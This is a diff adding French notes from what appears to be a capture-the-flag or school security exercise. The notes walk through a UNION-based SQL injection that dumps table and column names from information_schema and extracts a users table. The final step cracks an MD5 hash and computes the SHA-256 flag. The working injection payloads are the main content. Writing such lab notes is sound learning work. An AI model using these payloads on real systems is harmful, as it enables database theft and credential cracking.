@@ -1,0 +1,34 @@
+1 OR 1 = 1 -> id demande pas une str donc pas de ' ou "
+affiche la table, deux colonnes.
+
+1  UNION SELECT NULL,NULL-- 
+Nous confirme qu'il y a que deux et pas plus.
+
+1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+Affiche toute les tables
+
+1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- -
+Nous permets d'avoir le noms de la table -> users.
+
+1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database() -- -
+Nous permets d'avoir toute les colonnes.
+user_id,first_name,last_name,town,country,planet,Commentaire,countersign
+
+On peux afficher que deux colonnes max, on regarde tout:
+
+1  UNION SELECT first_name, last_name FROM users--
+1  UNION SELECT town,country FROM users--
+1  UNION SELECT planet,Commentaire FROM users--  
+1  UNION SELECT Commentaire,countersign FROM users--
+
+ID: 1  UNION SELECT Commentaire,countersign FROM users--  
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+Avec decode on trouve:
+5ff9d0165b4f92b14994e5c685cdce28 -> md5 -> FortyTwo
+fortytwo -> Sh256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+
+https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack
+https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
